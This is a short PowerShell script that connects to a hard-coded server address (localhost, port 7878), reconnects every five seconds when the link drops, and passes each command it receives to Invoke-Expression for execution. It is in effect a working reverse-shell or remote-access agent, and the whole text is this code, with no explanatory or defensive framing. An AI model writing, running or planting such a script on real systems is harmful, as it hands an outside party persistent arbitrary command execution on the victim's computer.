# Define server IP and port
$server = "127.0.0.1"
$port = 7878

# Function to connect to the server
function Connect-ToServer {
    param (
        [string]$Server,
        [int]$Port
    )

    $connected = $false
    while (-not $connected) {
        try {
            # Attempt to create a TCP client and connect to the server
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.Connect($Server, $Port)
            $connected = $true
            Write-Host "Connected to the server at ${Server}:${Port}"
            return $tcpClient
        } catch {
            Write-Host "Failed to connect to the server. Retrying in 5 seconds..."
            Start-Sleep -Seconds 5
        }
    }
}

# Function to execute received command
function Execute-Command {
    param (
        [string]$Command
    )
    Write-Host "Executing command: $Command"
    try {
        # Execute the command and capture the output
        $output = Invoke-Expression $Command
        Write-Host "Output:`n$output"
    } catch {
        Write-Host "Failed to execute command: $_"
    }
}

# Main script
$tcpClient = Connect-ToServer -Server $server -Port $port

# Get the network stream to read/write data
$networkStream = $tcpClient.GetStream()

# Loop to continuously receive and execute commands
while ($true) {
    # Buffer to store the server's command
    $buffer = New-Object Byte[] 512
    try {
        $bytesRead = $networkStream.Read($buffer, 0, $buffer.Length)
    } catch {
        Write-Host "Network error. Attempting to reconnect..."
        # Close current connections
        $networkStream.Close()
        $tcpClient.Close()
        # Attempt to reconnect
        $tcpClient = Connect-ToServer -Server $server -Port $port
        $networkStream = $tcpClient.GetStream()
        continue
    }

    # Exit loop if the server disconnects
    if ($bytesRead -eq 0) {
        Write-Host "Server disconnected. Attempting to reconnect..."
        # Close current connections
        $networkStream.Close()
        $tcpClient.Close()
        # Attempt to reconnect
        $tcpClient = Connect-ToServer -Server $server -Port $port
        $networkStream = $tcpClient.GetStream()
        continue
    }

    # Convert received bytes to string
    $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead).Trim()
    Write-Host "Received command from server: $command"

    # Execute the received command
    Execute-Command -Command $command
}

# Close the connection when done
$networkStream.Close()
$tcpClient.Close()
Write-Host "Disconnected from server"
